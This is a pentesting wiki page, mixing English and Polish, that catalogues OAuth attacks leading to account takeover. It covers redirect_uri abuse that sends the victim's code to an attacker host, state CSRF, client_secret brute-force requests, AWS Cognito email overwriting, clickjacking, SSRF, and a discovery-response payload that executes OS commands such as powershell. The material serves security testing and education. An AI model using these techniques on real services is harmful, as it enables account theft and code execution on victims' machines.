# OAuth to Account takeover

{{#include ../banners/hacktricks-training.md}}

## Podstawowe informacje <a href="#d4a8" id="d4a8"></a>

OAuth offers various versions, with foundational insights accessible at [OAuth 2.0 documentation](https://oauth.net/2/). This discussion primarily centers on the widely used [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), providing an **authorization framework that enables an application to access or perform actions on a user's account in another application** (the authorization server).

Consider a hypothetical website _**https://example.com**_, designed to **showcase all your social media posts**, including private ones. To achieve this, OAuth 2.0 is employed. _https://example.com_ will request your permission to **access your social media posts**. Consequently, a consent screen will appear on _https://socialmedia.com_, outlining the **permissions being requested and the developer making the request**. Upon your authorization, _https://example.com_ gains the ability to **access your posts on your behalf**.

It's essential to grasp the following components within the OAuth 2.0 framework:

- **resource owner**: Ty, jako **użytkownik/entitet**, udzielasz dostępu do swojego zasobu, np. postów na koncie w social media.
- **resource server**: Serwer obsługujący **uwierzytelnione żądania** po tym, jak aplikacja uzyska `access_token` w imieniu `resource owner`, np. **https://socialmedia.com**.
- **client application**: Aplikacja **poszukująca autoryzacji** od `resource owner`, np. **https://example.com**.
- **authorization server**: Serwer, który wydaje `access_tokens` dla `client application` po pomyślnym uwierzytelnieniu `resource owner` i uzyskaniu autoryzacji, np. **https://socialmedia.com**.
- **client_id**: Publiczny, unikalny identyfikator aplikacji.
- **client_secret:** Poufny klucz znany wyłącznie aplikacji i authorization server, używany do wygenerowania `access_tokens`.
- **response_type**: Wartość określająca **typ żądanego tokenu**, np. `code`.
- **scope**: **Poziom dostępu**, o jaki `client application` prosi `resource owner`.
- **redirect_uri**: URL, na który użytkownik zostanie przekierowany po autoryzacji. Zazwyczaj musi zgadzać się z wcześniej zarejestrowanym redirect URL.
- **state**: Parametr służący do **przechowywania danych podczas przekierowania użytkownika do i z authorization server**. Jego unikalność jest kluczowa, ponieważ pełni funkcję **mechanizmu ochrony przed CSRF**.
- **grant_type**: Parametr wskazujący **typ grantu i rodzaj zwracanego tokenu**.
- **code**: Kod autoryzacyjny od `authorization server`, używany wraz z `client_id` i `client_secret` przez client application do pozyskania `access_token`.
- **access_token**: Token, którego client application używa do wykonywania żądań API w imieniu `resource owner`.
- **refresh_token**: Pozwala aplikacji na **uzyskanie nowego `access_token` bez ponownego proszenia użytkownika o zgodę**.

### Flow

The **actual OAuth flow** proceeds as follows:

1. You navigate to [https://example.com](https://example.com) and select the “Integrate with Social Media” button.
2. The site then sends a request to [https://socialmedia.com](https://socialmedia.com) asking for your authorization to let https://example.com’s application access your posts. The request is structured as:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Następnie zostaje wyświetlona strona zgody.
4. Po Twojej zgodzie, Social Media wysyła odpowiedź na `redirect_uri` z parametrami `code` i `state`:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com wykorzystuje ten `code`, razem z jego `client_id` i `client_secret`, aby wykonać żądanie po stronie serwera w celu uzyskania `access_token` w Twoim imieniu, umożliwiając dostęp do uprawnień, na które wyraziłeś zgodę:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. W końcu proces kończy się, gdy https://example.com użyje twojego `access_token`, aby wykonać wywołanie API do serwisu społecznościowego w celu uzyskania dostępu

## Vulnerabilities <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Zgodnie z [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), authorization server musi przekierowywać przeglądarkę tylko do pre-registered, exact redirect URIs. Każda słabość tutaj pozwala atakującemu wysłać ofiarę przez złośliwy authorization URL tak, że IdP dostarczy `code` (i `state`) ofiary bezpośrednio do endpointu kontrolowanego przez atakującego, który może go zrealizować i zebrać tokeny.

Typowy przebieg ataku:

1. Przygotuj `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` i wyślij go do ofiary.
2. Ofiara się uwierzytelnia i zatwierdza scope'y.
3. IdP przekierowuje do `attacker.tld/callback?code=<victim-code>&state=...`, gdzie atakujący loguje żądanie i natychmiast wymienia code.

Typowe błędy walidacji do sprawdzenia:

- **No validation** – akceptowany jest dowolny absolutny URL, co prowadzi do natychmiastowego kradzieży code.
- **Weak substring/regex checks on the host** – obejście za pomocą lookalike’ów takich jak `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, lub `match.com@evil.com`.
- **IDN homograph mismatches** – walidacja odbywa się na formie punycode (`xn--`), ale przeglądarka przekierowuje do domeny Unicode kontrolowanej przez atakującego.
- **Arbitrary paths on an allowed host** – skierowanie `redirect_uri` na `/openredirect?next=https://attacker.tld` lub dowolny endpoint XSS/treści użytkownika wycieka code poprzez łańcuch przekierowań, Referer headers lub wstrzyknięty JavaScript.
- **Directory constraints without normalization** – wzorce takie jak `/oauth/*` można obejść przez `/oauth/../anything`.
- **Wildcard subdomains** – akceptowanie `*.example.com` oznacza, że każde takeover (dangling DNS, S3 bucket, itd.) natychmiast zapewnia ważny callback.
- **Non-HTTPS callbacks** – przepuszczanie `http://` URIs daje sieciowym atakującym (Wi‑Fi, corporate proxy) możliwość przechwycenia code w tranzycie.

Przejrzyj także pomocnicze parametry typu redirect (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, itd.) oraz OpenID discovery document (`/.well-known/openid-configuration`) pod kątem dodatkowych endpointów, które mogą dziedziczyć te same błędy walidacji.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Jak wspomniano w tym bug bounty report [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html), możliwe jest, że redirect URL jest odzwierciedlany w odpowiedzi serwera po uwierzytelnieniu użytkownika, będąc podatnym na XSS. Możliwy payload do przetestowania:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Improper handling of state parameter <a href="#bda5" id="bda5"></a>

Parametr `state` jest tokenem CSRF w Authorization Code flow: klient musi wygenerować **kryptograficznie losową wartość dla każdej instancji przeglądarki**, zapisać ją w miejscu, które tylko ta przeglądarka może odczytać (cookie, local storage, itp.), wysłać ją w żądaniu autoryzacji i odrzucić każdą odpowiedź, która nie zwraca tej samej wartości. Gdy wartość jest statyczna, przewidywalna, opcjonalna lub nie powiązana z sesją użytkownika, atakujący może dokończyć własny przebieg OAuth, przechwycić końcowe żądanie zawierające `?code=` (bez jego wysyłania) i później zmusić przeglądarkę ofiary do ponownego odtworzenia tego żądania, tak że konto ofiary zostanie powiązane z profilem atakującego w IdP.

Schemat odtwarzania (replay) jest zawsze taki sam:

1. Atakujący uwierzytelnia się w IdP swoim kontem i przechwytuje ostatnie przekierowanie zawierające `code` (i ewentualnie `state`).
2. Porzuca to żądanie, zachowuje URL i później nadużywa dowolnego mechanizmu CSRF (link, iframe, formularz auto-submitting), aby zmusić przeglądarkę ofiary do jego załadowania.
3. Jeśli klient nie egzekwuje `state`, aplikacja zaakceptuje wynik autoryzacji atakującego i zaloguje atakującego do konta aplikacji ofiary.

Praktyczna lista kontrolna obsługi `state` podczas testów:

- **Brak `state` całkowicie** – jeśli parametr nigdy się nie pojawia, całe logowanie jest podatne na CSRF.
- **`state` nieobowiązkowy** – usuń go z początkowego żądania; jeśli IdP nadal wydaje kody, które klient akceptuje, obrona jest opcjonalna (opt-in).
- **Zwracane `state` niezweryfikowane** – modyfikuj wartość w odpowiedzi (Burp, MITM proxy). Akceptowanie niezgodnych wartości oznacza, że przechowywany token nigdy nie jest porównywany.
- **Przewidywalne lub czysto oparte na danych `state`** – wiele aplikacji wkłada ścieżki przekierowań lub JSON-owe bloby do `state` bez wprowadzenia losowości, pozwalając atakującym odgadnąć prawidłowe wartości i odtwarzać flow. Zawsze dołączaj silną entropię przed lub po enkodowaniu danych.
- **Fixacja `state`** – jeśli aplikacja pozwala użytkownikom podać wartość `state` (np. przez spreparowane authorization URLs) i ponownie jej używa w flow, atakujący może ustawić znaną wartość i użyć jej wobec wielu ofiar.

PKCE może uzupełniać `state` (szczególnie dla public clients) poprzez powiązanie authorization code z `code_verifier`, ale web clients nadal muszą śledzić `state`, aby zapobiec cross-user CSRF/account-linking błędom.

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Brak weryfikacji e-mail przy tworzeniu konta**: Atakujący może uprzednio utworzyć konto używając adresu e-mail ofiary. Jeśli ofiara później zaloguje się przez zewnętrzną usługę, aplikacja może nieumyślnie powiązać to konto z wcześniej utworzonym kontem atakującego, prowadząc do nieautoryzowanego dostępu.
2. **Wykorzystywanie luźnej weryfikacji e-mail w OAuth**: Atakujący może wykorzystać serwisy OAuth, które nie weryfikują e-maili, rejestrując się u nich i następnie zmieniając adres e-mail konta na adres ofiary. Ta metoda podobnie stwarza ryzyko nieautoryzowanego dostępu do konta, analogicznie do pierwszego scenariusza, lecz innym wektorem ataku.

### Disclosure of Secrets <a href="#e177" id="e177"></a>

`client_id` jest celowo publiczny, ale **`client_secret` nigdy nie powinien być możliwy do odzyskania przez użytkowników końcowych**. Deploymenty Authorization Code, które osadzają sekret w **mobile APKs, desktop clients, or single-page apps** w praktyce przekazują to poświadczenie każdemu, kto potrafi pobrać pakiet. Zawsze sprawdzaj public clients poprzez:

- Rozpakowanie APK/IPA, instalatora desktopowego lub aplikacji Electron i przeszukanie (grep) pod kątem `client_secret`, Base64-owych blobów, które dekodują do JSON, lub zahardkodowanych endpointów OAuth.
- Przejrzenie dołączonych plików konfiguracyjnych (plist, JSON, XML) lub zdekompilowanych stringów w poszukiwaniu poświadczeń klienta.

Gdy atakujący wyekstrahuje sekret, musi jedynie ukraść dowolny authorization `code` ofiary (przez słaby `redirect_uri`, logi itp.), aby samodzielnie wywołać `/token` i wygenerować access/refresh tokens bez udziału legitnej aplikacji. Traktuj public/native clients jako **niezdolne do przechowywania sekretów** — powinny zamiast tego polegać na PKCE (RFC 7636), aby udowodnić posiadanie per-instance `code_verifier` zamiast statycznego sekretu. Podczas testów potwierdź, czy PKCE jest obowiązkowe i czy backend faktycznie odrzuca wymiany tokenów, które pomijają albo `client_secret` **lub** prawidłowy `code_verifier`.

### Client Secret Bruteforce

Możesz spróbować wykonać brute-force na `client_secret` dostawcy usług w identity provider, aby próbować przejąć konta.\
Żądanie do BF może wyglądać podobnie do:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer Header leaking Code + State

Gdy klient ma **code and state**, jeśli są one **reflected inside the Referer header** gdy przechodzi na inną stronę, to jest podatny.

### Access Token przechowywany w historii przeglądarki

Główna gwarancja Authorization Code grant polega na tym, że **access tokens never reach the resource owner’s browser**. When implementations leak tokens client-side, nawet drobny błąd (XSS, Referer leak, proxy logging) prowadzi do natychmiastowego przejęcia konta. Zawsze sprawdzaj:

- **Tokens in URLs** – jeśli `access_token` pojawia się w query/fragment, trafia do historii przeglądarki, logów serwera, analityki oraz Referer headers wysyłanych do stron trzecich.
- **Tokens transiting untrusted middleboxes** – zwracanie tokenów przez HTTP lub przez debugging/corporate proxies pozwala obserwatorom sieci przechwycić je bezpośrednio.
- **Tokens stored in JavaScript state** – React/Vue stores, global variables lub serializowane bloby JSON ujawniają tokeny wszystkim skryptom na originie (w tym XSS payloadom lub złośliwym rozszerzeniom).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` przechowują tokeny długo po wylogowaniu na współdzielonych urządzeniach i są dostępne dla skryptów.

Każde z tych odkryć zwykle eskaluje inaczej „niskie” błędy (jak bypass CSP czy DOM XSS) do pełnego przejęcia API, ponieważ atakujący może po prostu odczytać i replay the leaked bearer token.

### Everlasting Authorization Code

Authorization codes muszą być **krótkotrwałe, jednorazowe i odporne na replay**. Próbując ocenić flow, przechwyć `code` i:

- **Test the lifetime** – RFC 6749 rekomenduje minuty, nie godziny. Spróbuj zrealizować code po 5–10 minutach; jeśli nadal działa, okno ekspozycji dla jakiegokolwiek leaked code jest zbyt długie.
- **Test sequential reuse** – wyślij ten sam `code` dwa razy. Jeśli drugie żądanie zwraca kolejny token, atakujący mogą klonować sesje w nieskończoność.
- **Test concurrent redemption/race conditions** – wyślij dwa token requests równolegle (Burp intruder, turbo intruder). Słabi issuerzy czasem wydają oba.
- **Observe replay handling** – próba ponownego użycia powinna nie tylko zawieść, ale też unieważnić wszystkie tokeny już wystawione z tego code. W przeciwnym razie wykryty replay pozostawia pierwszy token atakującego aktywny.

Połączenie replay-friendly code z dowolnym `redirect_uri` lub bugiem w logowaniu pozwala na utrzymanie dostępu do konta nawet po tym, jak ofiara zakończy poprawne logowanie.

### Authorization/Refresh Token not bound to client

Jeśli możesz zdobyć **authorization code i użyć go z innym clientem**, wtedy możesz takeover kont innych użytkowników.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Sprawdź ten wpis**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

W tym bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) widać, że **token**, który **AWS Cognito** zwraca użytkownikowi może mieć **wystarczające uprawnienia do nadpisania danych użytkownika**. W związku z tym, jeśli możesz **change the user email for a different user email**, możesz być w stanie **take over** kont innych osób.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
Aby uzyskać bardziej szczegółowe informacje o tym, jak nadużywać AWS Cognito sprawdź [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Abusing other Apps tokens <a href="#bda5" id="bda5"></a>

Jak [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), przepływy OAuth, które oczekują otrzymania **token** (a nie kodu), mogą być podatne, jeśli nie sprawdzają, czy token należy do danej aplikacji.

To dlatego, że **atakujący** mógłby utworzyć **application supporting OAuth and login with Facebook** (na przykład) we własnej aplikacji. Następnie, gdy ofiara zaloguje się przez Facebook w **attackers application**, atakujący mógłby uzyskać **OAuth token of the user given to his application, and use it to login in the victim OAuth application using the victims user token**.

> [!CAUTION]
> Dlatego, jeśli atakującemu uda się sprawić, by użytkownik uzyskał dostęp do jego własnej aplikacji OAuth, będzie w stanie przejąć konto ofiary w aplikacjach, które oczekują tokenu i nie sprawdzają, czy token został przyznany dla ich app ID.

### Two links & cookie <a href="#bda5" id="bda5"></a>

Według [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), możliwe było spowodowanie, by ofiara otworzyła stronę z **returnUrl** wskazującym na hosta atakującego. Ta informacja byłaby **stored in a cookie (RU)** i w **późniejszym kroku** **prompt** **poprosi** **użytkownika**, czy chce przyznać dostęp temu hostowi atakującego.

Aby obejść ten prompt, możliwe było otwarcie karty, by zainicjować **Oauth flow**, która ustawiłaby to RU cookie używając **returnUrl**, zamknięcie karty zanim prompt zostanie pokazany i otwarcie nowej karty bez tej wartości. Wówczas **prompt won't inform about the attackers host**, ale cookie będzie do niego ustawione, więc **token will be sent to the attackers host** w przekierowaniu.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

Jak wyjaśniono w [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), niektóre implementacje OAuth pozwalają wskazać GET parametr **`prompt`** jako None (**`&prompt=none`**) aby **zapobiec wyświetleniu użytkownikom prośby o potwierdzenie** przyznanego dostępu w prompt na stronie, jeśli są już zalogowani na platformie.

### response_mode

Jak [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), możliwe jest wskazanie parametru **`response_mode`**, aby określić, gdzie chcesz otrzymać kod w końcowym URL:

- `response_mode=query` -> Kod jest dostarczany w parametrze GET: `?code=2397rf3gu93f`
- `response_mode=fragment` -> Kod jest dostarczany w fragmencie URL: `#code=2397rf3gu93f`
- `response_mode=form_post` -> Kod jest dostarczany w formularzu POST w polu o nazwie `code` i wartości
- `response_mode=web_message` -> Kod jest wysyłany w postMessage: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

Dialogi zgody/logowania OAuth są idealnymi celami do clickjackingu: jeśli można je osadzić w ramce, atakujący może nałożyć własne grafiki, ukryć prawdziwe przyciski i oszukać użytkowników, by zatwierdzili niebezpieczne scope'y lub powiązali konta. Buduj PoC, które:

1. Załadują URL autoryzacji IdP wewnątrz `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Użyją pozyjonowania absolutnego/trików z opacity, aby wyrównać fałszywe przyciski z ukrytymi kontrolkami **Allow**/**Approve**.
3. Opcjonalnie wstępnie wypełnią parametry (scopes, redirect URI), tak aby skradzione zatwierdzenie natychmiast przyniosło korzyść atakującemu.

Podczas testów sprawdź, czy strony IdP wysyłają `X-Frame-Options: DENY/SAMEORIGIN` lub restrykcyjne `Content-Security-Policy: frame-ancestors 'none'`. Jeśli żadna z tych nagłówków nie występuje, zademonstruj ryzyko przy użyciu narzędzi takich jak [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) i zarejestruj, jak łatwo ofiara autoryzuje aplikację atakującego. Dodatkowe pomysły na payloady znajdują się w [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

Jak opisano w [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), jest to OAuth flow, który pozwala zalogować się przez OAuth za pomocą **username** i **password**. Jeśli w trakcie tego prostego przepływu zostanie zwrócony **token** z dostępem do wszystkich akcji, które użytkownik może wykonać, to możliwe jest obejście 2 FA przy użyciu tego tokenu.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

Ten [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) opisuje, jak możliwe było nadużycie **open redirect** używając wartości z **referrer** do przeprowadzenia OAuth -> ATO. Atak wyglądał następująco:

1. Ofiara odwiedza stronę atakującego.
2. Ofiara otwiera złośliwy link i opener uruchamia Google OAuth flow z dodatkowymi parametrami `response_type=id_token,code&prompt=none`, używając jako **referrer** witryny atakującego.
3. W openerze, po tym jak provider autoryzuje ofiarę, odsyła ją z powrotem do wartości parametru `redirect_uri` (strona ofiary) z 30X kodem, który dalej zachowuje witrynę atakującego w refererze.
4. Strona ofiary **trigger the open redirect based on the referrer** przekierowuje użytkownika na stronę atakującego, a ponieważ **`respose_type`** był **`id_token,code`**, kod zostanie wysłany do atakującego w **fragmencie** URL, co pozwala mu przejąć konto użytkownika przez Google na stronie ofiary.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **W celu uzyskania dalszych szczegółów tej techniki.**

Dynamic Client Registration w OAuth służy jako mniej oczywisty, ale krytyczny wektor podatności bezpieczeństwa, w szczególności dla ataków typu **Server-Side Request Forgery (SSRF)**. Ten endpoint pozwala serwerom OAuth otrzymywać informacje o aplikacjach klienckich, w tym wrażliwe URL-e, które można wykorzystać.

Kluczowe punkty:

- **Dynamic Client Registration** jest często mapowany na `/register` i akceptuje dane takie jak `client_name`, `client_secret`, `redirect_uris` oraz URL-e do logo lub JSON Web Key Sets (JWKs) poprzez żądania POST.
- Ta funkcja przestrzega specyfikacji zawartych w **RFC7591** i **OpenID Connect Registration 1.0**, które zawierają parametry potencjalnie podatne na SSRF.
- Proces rejestracji może niezamierzenie wystawić serwery na SSRF na kilka sposobów:
- **`logo_uri`**: URL do logo aplikacji klienckiej, który serwer może pobrać, wywołując SSRF lub prowadząc do XSS, jeśli URL jest źle obsłużony.
- **`jwks_uri`**: URL do dokumentu JWK klienta, który, jeśli jest złośliwie spreparowany, może spowodować, że serwer wykona żądania wychodzące do serwera kontrolowanego przez atakującego.
- **`sector_identifier_uri`**: odwołuje się do tablicy JSON `redirect_uris`, którą serwer może pobrać, tworząc okazję do SSRF.
- **`request_uris`**: lista dozwolonych request URI dla klienta, którą można wykorzystać, jeśli serwer pobiera te URI na początku procesu autoryzacji.

Strategia eksploatacji:

- SSRF można wywołać, rejestrując nowego klienta z złośliwymi URL-ami w parametrach takich jak `logo_uri`, `jwks_uri` lub `sector_identifier_uri`.
- Podczas gdy bezpośrednia eksploatacja przez `request_uris` może być ograniczona przez mechanizmy whitelist, dostarczenie wstępnie zarejestrowanego, kontrolowanego przez atakującego `request_uri` może ułatwić SSRF podczas fazy autoryzacji.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

Badania dotyczące [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (wpływającego na klientów `mcp-remote` takich jak Claude Desktop, Cursor czy Windsurf) pokazują, jak **dynamic OAuth discovery becomes an RCE primitive** zawsze, gdy klient przekazuje metadane IdP bezpośrednio do systemu operacyjnego. Zdalny serwer MCP zwraca kontrolowany przez atakującego `authorization_endpoint` podczas wymiany discovery (`/.well-known/openid-configuration` lub dowolnego RPC metadanych). `mcp-remote ≤0.1.15` następnie wywoływał systemowy handler URL (`start`, `open`, `xdg-open` itp.) z dowolnym otrzymanym stringiem, więc dowolny scheme/path obsługiwany przez OS był wykonywany lokalnie.

Przebieg ataku

1. Wskaż desktopowego agenta na wrogiego MCP/OAuth servera (`npx mcp-remote https://evil`). Agent otrzymuje `401` plus metadane.
2. Serwer odpowiada JSON-em takim jak:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. Klient uruchamia handler systemu operacyjnego dla dostarczonego URI. Windows akceptuje payloady takie jak `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux akceptują `file:///Applications/Calculator.app/...` lub nawet niestandardowe schemy, np. `cmd://bash -lc '<payload>'`, jeśli są zarejestrowane.
4. Ponieważ dzieje się to przed jakąkolwiek interakcją użytkownika, **sam fakt skonfigurowania klienta do komunikacji z serwerem atakującego skutkuje wykonaniem kodu**.

**Jak testować**

- Celuj w dowolny desktop/agent obsługujący OAuth, który wykonuje discovery przez HTTP(S) i otwiera zwrócone endpointy lokalnie (Electron apps, CLI helpers, thick clients).
- Przechwyć lub hostuj odpowiedź discovery i zamień pola takie jak `authorization_endpoint`, `device_authorization_endpoint` lub podobne na `file://`, `cmd://`, ścieżki UNC lub inne niebezpieczne schemy.
- Sprawdź, czy klient waliduje scheme/host. Brak walidacji skutkuje natychmiastowym wykonaniem w kontekście użytkownika i potwierdza problem.
- Powtórz test z różnymi schemami, aby zmapować całą powierzchnię ataku (np. `ms-excel:`, `data:text/html,`, custom protocol handlers) i wykazać cross-platformowy zasięg.

## Warunki wyścigu u dostawców OAuth

Jeśli platforma, którą testujesz, jest dostawcą OAuth [**przeczytaj to, aby przetestować możliwe Race Conditions**](race-condition.md).

## Mutable Claims Attack

W OAuth pole sub jednoznacznie identyfikuje użytkownika, ale jego format różni się w zależności od Authorization Server. Aby ustandaryzować identyfikację użytkownika, niektóre klienci używają adresów email lub handle’ów użytkownika. To jednak jest ryzykowne, ponieważ:

- Niektóre Authorization Server nie gwarantują, że te właściwości (np. email) pozostaną niemutowalne.
- W pewnych implementacjach — takich jak **"Login with Microsoft"** — klient polega na polu email, które jest **kontrolowane przez użytkownika w Entra ID** i nie jest weryfikowane.
- Atakujący może to wykorzystać, tworząc własną organizację Azure AD (np. doyensectestorg) i użyć jej do wykonania logowania Microsoft.
- Chociaż Object ID (przechowywane w sub) jest niemutowalne i bezpieczne, poleganie na mutowalnym polu email może umożliwić account takeover (np. przejęcie konta takiego jak victim@gmail.com).

## Client Confusion Attack

W ramach **Client Confusion Attack** aplikacja używająca OAuth Implicit Flow nie weryfikuje, że ostateczny access token został wygenerowany konkretnie dla jej własnego Client ID. Atakujący uruchamia publiczną stronę wykorzystującą Google’s OAuth Implicit Flow, wabiąc tysiące użytkowników do logowania i zbierając access tokeny przeznaczone dla strony atakującego. Jeśli ci użytkownicy mają także konta na innej podatnej stronie, która nie weryfikuje Client ID tokena, atakujący może ponownie użyć zebranych tokenów, by podszyć się pod ofiary i przejąć ich konta.

## Scope Upgrade Attack

Typ **Authorization Code Grant** obejmuje bezpieczną komunikację server-to-server przy przesyłaniu danych użytkownika. Jednak jeśli **Authorization Server** implicitnie ufa parametrowi scope w Access Token Request (parametr nieokreślony w RFC), złośliwa aplikacja może podnieść uprawnienia authorization code, żądając wyższego scope. Po wygenerowaniu **Access Token**, **Resource Server** musi go zweryfikować: dla tokenów JWT oznacza to sprawdzenie podpisu JWT i wyciągnięcie danych takich jak client_id i scope, natomiast dla tokenów będących losowymi stringami serwer musi zapytać Authorization Server o szczegóły tokena.

## Redirect Scheme Hijacking

W mobilnych implementacjach OAuth aplikacje używają **custom URI schemes** do odbierania redirectów z Authorization Codes. Jednak ponieważ wiele aplikacji może zarejestrować ten sam scheme na urządzeniu, założenie, że tylko legitny klient kontroluje redirect URI, zostaje złamane. Na Androidzie, na przykład, Intent URI takie jak `com.example.app://` oauth jest łapane na podstawie schemy i opcjonalnych filtrów zdefiniowanych w intent-filter aplikacji. Ponieważ rozwiązywanie intentów w Androidzie może być szerokie — zwłaszcza gdy określona jest tylko schema — atakujący może zarejestrować złośliwą aplikację z odpowiednio spreparowanym intent filter, aby przechwycić authorization code. Może to **enable an account takeover** albo poprzez interakcję użytkownika (gdy wiele aplikacji kwalifikuje się do obsługi intencji), albo poprzez techniki bypassujące wykorzystujące zbyt specyficzne filtry, jak opisano w flowcharcie oceny Ostorlab.

## Referencje

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)

{{#include ../banners/hacktricks-training.md}}
